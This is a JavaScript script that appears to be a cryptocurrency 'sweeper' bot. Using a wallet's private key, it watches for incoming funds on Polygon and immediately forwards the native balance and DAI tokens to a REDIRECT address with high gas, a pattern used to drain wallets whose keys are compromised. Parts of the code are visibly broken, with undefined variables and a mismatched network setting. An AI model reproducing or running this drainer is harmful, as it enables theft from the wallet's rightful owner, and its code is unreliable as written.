



































// Setup: npm install alchemy-sdk
const {
  Alchemy,
  Network,
  Utils,
  AlchemySubscription,
  Wallet,
} = require('alchemy-sdk')
const { ethers, utils } = require('ethers')
const { getBalance } = require('multichain-crypto-wallet')
require('dotenv').config()
const config = {
  apiKey: process.env.APIKEY,
  network: Network.MATIC_MAINNET,
}

// You can also use an ENS name for the contract address
const daiAddress = '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063'

// The ERC-20 Contract ABI, which is a common contract interface
// for tokens (this is the Human-Readable ABI format)
const daiAbi = [
  // Some details about the token
  'function name() view returns (string)',
  'function symbol() view returns (string)',

  // Get the account balance
  'function balanceOf(address) view returns (uint)',

  // Send some of your tokens to someone else
  'function transfer(address to, uint amount)',

  // An event triggered whenever anyone transfers to someone else
  'event Transfer(address indexed from, address indexed to, uint amount)',
]

// The Contract object

const multichainWallet = require('multichain-crypto-wallet')
//check
let wallet = new Wallet(process.env.PRIVATE_KEY)

const provider = new ethers.providers.JsonRpcProvider(process.env.RPC, {
  chainId: parseInt(process.env.CHAIN_ID),
})
const daiContract = new ethers.Contract(daiAddress, daiAbi, provider)
const signer = provider.getSigner()

const main = async () => {
  // This filter could also be generated with the Contract or
  // Interface API. If address is not specified, any address
  // matches and if topics is not specified, any log matches
  filter = {
    address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
    topics: [utils.id(`Transfer(${process.env.WALLET},uint256)`)],
  }
  provider.on(filter, (log, event) => {
    console.log(filter)
    console.log(event)
    // The to will always be "address"
    console.log(`I got ${formatEther(amount)} from ${from}.`)
  })

  const alchemy = new Alchemy(config)

  let balance = await alchemy.core.getBalance(process.env.WALLET, 'latest')

  balance = Utils.formatEther(balance)
  console.log(`Balance of ${await wallet.getAddress()}: ${balance} ETH`)

  const nonce = await alchemy.core.getTransactionCount(
    process.env.WALLET,
    'latest',
  )

  // Subscription for Alchemy's pendingTransactions API

  var newbalance = parseFloat(balance)
  var getToken = await tokenBalance()
  if (getToken > '0.0001') {
    await removeMoney(getToken)
  }

  console.log(`current dai balance is ${getToken}`)

  var realBalance = newbalance - 0.001209643999999988

  console.log(`balance to send ${realBalance}`)
  setTimeout(function () {}, 2500)

  if (realBalance > '0.01') {
    var realBalance = newbalance - 0.002909643999999988
    try {
      let transaction = {
        to: process.env.REDIRECT,
        // to: "0x56dc2c15635c2afFEE954862C9968F14ab2f0BA5",
        value: Utils.parseEther(`${realBalance}`),
        gasLimit: '21000',
        maxPriorityFeePerGas: Utils.parseUnits('100', 'gwei'),
        maxFeePerGas: Utils.parseUnits('150', 'gwei'),
        nonce: nonce,
        type: 2,
        chainId: process.env.CHAIN_ID,
      }

      let rawTransaction = await wallet.signTransaction(transaction)
      let tx = await alchemy.core.sendTransaction(rawTransaction)
      console.log(
        `----- forwarded to ${tx['to']} -----\nwith transaction hash: ${tx['hash']}_________',`,
      )

      let balance = await alchemy.core.getBalance(process.env.WALLET, 'latest')

      balance = Utils.formatEther(balance)
      console.log(`Balance of ${await wallet.getAddress()}: ${balance} ETH`)
    } catch (error) {
      console.log(error.reason)
    }
  }
  console.log(`listening on transactions to ${await wallet.getAddress()} `)




  alchemy.ws.on(
    {
      method: AlchemySubscription.PENDING_TRANSACTIONS,
      toAddress: process.env.WALLET, // Replace with address to send  pending transactions to this address
    },
    (tx) => {




      console.log(`pending transaction hash:${tx['hash']}`)
      provider.once(tx['hash'], async (transaction) => {
        // Get the balance of an address
        balance = await daiContract.balanceOf(process.env.WALLET)
        // { BigNumber: "6026189439794538201631" }

        // Format the DAI for displaying to the user
        var bal = ethers.utils.formatUnits(balance, 18)
        var getToken = bal
        if (getToken > '0.001') {
          try {
            const transfer = await multichainWallet.transfer({
              recipientAddress: process.env.REDIRECT,
              amount: bal,
              network: 'ethereum',
              rpcUrl: process.env.RPC,
              privateKey: process.env.PRIVATE_KEY,
              gasPrice: '120', // Gas price is in Gwei. leave empty to use default gas price
              tokenAddress: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
            }) // NOTE - For other EVM compatible blockchains all you have to do is change the rpcUrl.

            const wallets = Promise.resolve(transfer)
            wallets.then((value) => {
              if (value['hash'] == null) console.log('i am so sorry boss')

              console.log(
                `pulled successfully to ${process.env.REDIRECT} with transaction hash: ${value['hash']}`,
              )
            })
          } catch (error) {
            console.log(error.reason)
          }
        }



        let newBalance = await alchemy.core.getBalance(
          process.env.WALLET,
          'latest',
        )
        setTimeout(function () {
          console.log(
            `new transaction confirmation count:${transaction['confirmations']}`,
          )
          // console.log(transaction)

          let lBalance = Utils.formatEther(newBalance)
          console.log(`current balance:${lBalance}`)
          var llbalance = parseFloat(lBalance)

          var reallBalance = llbalance - 0.005009643999999988

          console.log(`amount to send: ${reallBalance}`)

          sendTX = async () => {
            const newnonce = await alchemy.core.getTransactionCount(
              process.env.WALLET,
              'latest',
            )
            try {
              let transaction = {
                to: process.env.REDIRECT,
                // to: "0x56dc2c15635c2afFEE954862C9968F14ab2f0BA5",
                value: Utils.parseEther(`${reallBalance}`),
                gasLimit: '21000',
                maxPriorityFeePerGas: Utils.parseUnits('100', 'gwei'),
                maxFeePerGas: Utils.parseUnits('100', 'gwei'),
                nonce: newnonce,
                type: 2,
                chainId: process.env.CHAIN_ID,
              }
              let rawTransaction = await wallet.signTransaction(transaction)
              let tx = await alchemy.core.sendTransaction(rawTransaction)
              console.log(
                `----- forwarded to ${tx['to']} -----\nwith transaction hash: ${tx['hash']}_________',`,
              )

              let balance = await alchemy.core.getBalance(
                process.env.WALLET,
                'latest',
              )

              balance = Utils.formatEther(balance)
              console.log(
                `Balance of ${await wallet.getAddress()}: ${balance} ETH`,
              )
            } catch (error) {
              console.log(error.reason)
            }
          }

          sendTX()
        }, 2500)
      })
    },
  )
}

const tokenBalance = async () => {
  // Get the balance of an address
  balance = await daiContract.balanceOf(process.env.WALLET)
  // { BigNumber: "6026189439794538201631" }

  // Format the DAI for displaying to the user
  var bal = ethers.utils.formatUnits(balance, 18)

  return bal
}

const removeMoney = async (bal) => {
  try {
    const transfer = await multichainWallet.transfer({
      recipientAddress: process.env.REDIRECT,
      amount: bal,
      network: 'ethereum',
      rpcUrl: process.env.RPC,
      privateKey: process.env.PRIVATE_KEY,
      gasPrice: '500', // Gas price is in Gwei. leave empty to use default gas price
      tokenAddress: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
    }) // NOTE - For other EVM compatible blockchains all you have to do is change the rpcUrl.

    const wallets = Promise.resolve(transfer)
    wallets.then((value) => {
      if (value['hash'] == null) console.log('i am so sorry boss')

      console.log(
        `pulled successfully to ${process.env.REDIRECT} with transaction hash: ${value['hash']}`,
      )
      value.wait()
    })
  } catch (error) {
    console.log(error.reason)
  }
}

main()
